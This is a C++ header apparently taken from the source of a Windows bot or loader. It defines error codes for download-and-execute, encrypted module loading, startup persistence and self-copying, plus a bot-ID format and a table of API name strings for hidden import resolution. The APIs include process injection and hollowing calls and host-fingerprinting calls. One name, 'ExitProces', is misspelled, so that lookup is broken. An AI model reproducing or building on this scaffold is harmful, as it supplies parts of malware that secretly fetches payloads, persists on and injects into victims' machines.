#pragma once

//http errors
#define INVALID_INTERNET_SESSION 1
#define INTERNET_CONNECT_ERROR 2
#define INVALID_REQUEST 3
#define INVALID_RESPONSE_SIZE 4
#define SEND_REQ_ERROR 5
//TaskTable errors
#define DECRYPT_MODULE_ERROR 11
#define LOAD_MODULE_ERROR 12
#define EXEC_MODULE_ERROR 13
//dlexec errors
#define PARSE_HOST_ERROR 21
#define PARSE_PATH_ERROR 22
#define SEND_HTTPREQ_ERROR 23
#define EXECUTING_FILE_ERROR 24
#define WRITING_FILE_ERROR 25
//main
#define STARTUP_ADD_ERROR 31
#define WRITE_OLD_PATH_ERROR 32
#define BOT_COPY_ERROR 33

namespace StaticData
{
	static LPCWSTR botidFmt = L"%08lX%04lX%lu";

	// DLL names
	static LPCWSTR User32dll = L"User32.dll";
	static LPCWSTR Kernel32dll = L"Kernel32.dll";
	static LPCWSTR Shlwapidll = L"Shlwapi.dll";
	static LPCWSTR Shell32dll = L"Shell32.dll";
	static LPCWSTR Wininetdll = L"Wininet.dll";
	static LPCWSTR Msvcrtdll = L"msvcrt.dll";
	static LPCWSTR Ntdll = L"ntdll.dll";
	static LPCWSTR Ole32dll = L"Ole32.dll";
	static LPCWSTR Advapi32dll = L"Advapi32.dll";

	// API names
	static LPCSTR VirtualProtect = "VirtualProtect";
	static LPCSTR InternetQueryDataAvailable = "InternetQueryDataAvailable";
	static LPCSTR lstrlenW = "lstrlenW";
	static LPCSTR lstrcmpW = "lstrcmpW";
	static LPCSTR GetWindowTextW = "GetWindowTextW";
	static LPCSTR GetForegroundWindow = "GetForegroundWindow";
	static LPCSTR GetUserNameW = "GetUserNameW";
	static LPCSTR GetComputerNameW = "GetComputerNameW";
	static LPCSTR WideCharToMultiByte = "WideCharToMultiByte";
	static LPCSTR GetSystemDefaultLCID = "GetSystemDefaultLCID";
	static LPCSTR GetLocaleInfoW = "GetLocaleInfoW";
	static LPCSTR GetLocalTime = "GetLocalTime";
	static LPCSTR GetTokenInformation = "GetTokenInformation";
	static LPCSTR GetCurrentProcess = "GetCurrentProcess";
	static LPCSTR OpenProcessToken = "OpenProcessToken";
	static LPCSTR GetWindowRect = "GetWindowRect";
	static LPCSTR GetDesktopWindow = "GetDesktopWindow";
	static LPCSTR GetLogicalDrives = "GetLogicalDrives";
	static LPCSTR GlobalMemoryStatusEx = "GlobalMemoryStatusEx";
	static LPCSTR EnumDisplayDevicesW = "EnumDisplayDevicesW";
	static LPCSTR lstrcatW = "lstrcatW";
	static LPCSTR GetLastError = "GetLastError";
	static LPCSTR CreateMutexW = "CreateMutexW";
	static LPCSTR MoveFileW = "MoveFileW";
	static LPCSTR MultiByteToWideChar = "MultiByteToWideChar";
	static LPCSTR SHGetSpecialFolderPathW = "SHGetSpecialFolderPathW";
	static LPCSTR CoUninitialize = "CoUninitialize";
	static LPCSTR CoCreateInstance = "CoCreateInstance";
	static LPCSTR CoInitialize = "CoInitialize";
	static LPCSTR calloc = "calloc";
	static LPCSTR GetCurrentProcessId = "GetCurrentProcessId";
	static LPCSTR ResumeThread = "ResumeThread";
	static LPCSTR SetThreadContext = "SetThreadContext";
	static LPCSTR ReadProcessMemory = "ReadProcessMemory";
	static LPCSTR GetThreadContext = "GetThreadContext";
	static LPCSTR Thread32Next = "Thread32Next";
	static LPCSTR Thread32First = "Thread32First";
	static LPCSTR GetFileAttributesA = "GetFileAttributesA";
	static LPCSTR ExitThread = "ExitThread";
	static LPCSTR HttpQueryInfoW = "HttpQueryInfoW";
	static LPCSTR free = "free";
	static LPCSTR malloc = "malloc";
	static LPCSTR memset = "memset";
	static LPCSTR memcpy = "memcpy";
	static LPCSTR InternetCloseHandle = "InternetCloseHandle";
	static LPCSTR InternetReadFile = "InternetReadFile";
	static LPCSTR HttpSendRequestW = "HttpSendRequestW";
	static LPCSTR HttpOpenRequestW = "HttpOpenRequestW";
	static LPCSTR InternetConnectW = "InternetConnectW";
	static LPCSTR InternetOpenW = "InternetOpenW";
	static LPCSTR GetWindowsDirectoryW = "GetWindowsDirectoryW";
	static LPCSTR GetVolumeInformationW = "GetVolumeInformationW";
	static LPCSTR ZwAllocateVirtualMemory = "ZwAllocateVirtualMemory";
	static LPCSTR Process32NextW = "Process32NextW";
	static LPCSTR Process32FirstW = "Process32FirstW";
	static LPCSTR CreateToolhelp32Snapshot = "CreateToolhelp32Snapshot";
	static LPCSTR VirtualFreeEx = "VirtualFreeEx";
	static LPCSTR WaitForSingleObject = "WaitForSingleObject";
	static LPCSTR CreateRemoteThread = "CreateRemoteThread";
	static LPCSTR WriteProcessMemory = "WriteProcessMemory";
	static LPCSTR VirtualAllocEx = "VirtualAllocEx";
	static LPCSTR OpenProcess = "OpenProcess";
	static LPCSTR ReadFile = "ReadFile";
	static LPCSTR VirtualAlloc = "VirtualAlloc";
	static LPCSTR GetFileSize = "GetFileSize";
	static LPCSTR GetModuleFileNameW = "GetModuleFileNameW";
	static LPCSTR ExitProces = "ExitProces";
	static LPCSTR Sleep = "Sleep";
	static LPCSTR CreateProcessA = "CreateProcessA";
	static LPCSTR CloseHandle = "CloseHandle";
	static LPCSTR CreateFileW = "CreateFileW";
	static LPCSTR WriteFile = "WriteFile";
	static LPCSTR GetNativeSystemInfo = "GetNativeSystemInfo";
	static LPCSTR CreateThread = "CreateThread";
	static LPCSTR GetTempPathW = "GetTempPathW";
	static LPCSTR GetTempFileNameW = "GetTempFileNameW";
	static LPCSTR CreateDirectoryW = "CreateDirectoryW";
	static LPCSTR wsprintfW = "wsprintfW";
	static LPCSTR realloc = "realloc";
	static LPCSTR PathFindFileNameA = "PathFindFileNameA";
	static LPCSTR SHGetFolderPathW = "SHGetFolderPathW";
	static LPCSTR ShellExecuteW = "ShellExecuteW";
	static LPCSTR MessageBoxW = "MessageBoxW";
}